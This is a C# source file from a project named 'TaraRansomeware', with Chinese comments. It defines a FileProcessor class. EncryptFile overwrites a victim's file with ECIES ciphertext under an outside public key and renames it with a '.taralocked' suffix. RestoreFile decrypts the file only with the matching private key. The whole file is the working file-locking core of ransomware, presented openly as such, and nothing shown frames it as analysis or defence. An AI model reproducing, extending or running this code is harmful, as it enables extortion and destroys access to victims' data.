using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Diagnostics;
using System.IO;

namespace TaraRansomeware
{
    internal class FileProcessor
    {
        /// <summary>
        /// 加密文件的后缀名
        /// </summary>
        public static readonly string lockSuffix = ".taralocked";

        /// <summary>
        /// ECIES加密引擎
        /// </summary>
        private EciesCipherEngine engine = null;

        /// <summary>
        /// 构造处理器
        /// </summary>
        /// <param name="guid">用户机器的唯一识别码</param>
        public FileProcessor(byte[] guid)
        {
            engine = new EciesCipherEngine(guid);
        }

        /// <summary>
        /// 文件加密
        /// </summary>
        /// <param name="pubKey">椭圆曲线公钥</param>
        /// <param name="filePath">文件路径</param>
        /// <returns>文件加密后的文件名</returns>
        public string EncryptFile(ECPublicKeyParameters pubKey, string filePath)
        {
            byte[] cleartext = File.ReadAllBytes(filePath);

            AsymmetricCipherKeyPair Rand = KeyUtils.GenerateKeyPair();

            byte[] ciphertext = engine.Encrypt(
                (ECPublicKeyParameters)pubKey,
                (ECPrivateKeyParameters)Rand.Private,
                cleartext
            );

            using (FileStream fs = File.OpenWrite(filePath))
            {
                byte[] hexPubKey = KeyUtils.EncodeECPublicKey((ECPublicKeyParameters)Rand.Public);
                Debug.Assert(
                    hexPubKey.Length == 33,
                    "Encoded EC public key must be in hex compressed format"
                );

                fs.Write(hexPubKey, 0, hexPubKey.Length);
                fs.Write(ciphertext, 0, ciphertext.Length);
            }

            string lockedPath = filePath + lockSuffix;
            File.Move(filePath, lockedPath);

            return lockedPath;
        }

        /// <summary>
        /// 文件恢复
        /// </summary>
        /// <param name="privKey">椭圆曲线私钥</param>
        /// <param name="filePath">文件路径</param>
        /// <returns>文件解密后的文件名</returns>
        public string RestoreFile(ECPrivateKeyParameters privKey, string filePath)
        {
            byte[] content = File.ReadAllBytes(filePath);

            Debug.Assert(
               content.Length >= 33,
               "Cannot retrieve an entire public key from " + filePath
            );

            byte[] hexPubRand = new byte[33];
            Array.Copy(content, 0, hexPubRand, 0, 33);
            ECPublicKeyParameters pubRand = KeyUtils.DecodeECPublicKey(hexPubRand);

            byte[] ciphertext = new byte[content.Length - 33];
            Array.Copy(content, 33, ciphertext, 0, content.Length - 33);


            byte[] cleartext = engine.Decrypt(
                (ECPrivateKeyParameters)privKey,
                (ECPublicKeyParameters)pubRand,
                ciphertext
            );

            File.WriteAllBytes(filePath, cleartext);

            string originPath = filePath.Replace(lockSuffix, "");
            File.Move(filePath, originPath);
            return originPath;
        }
    }
}

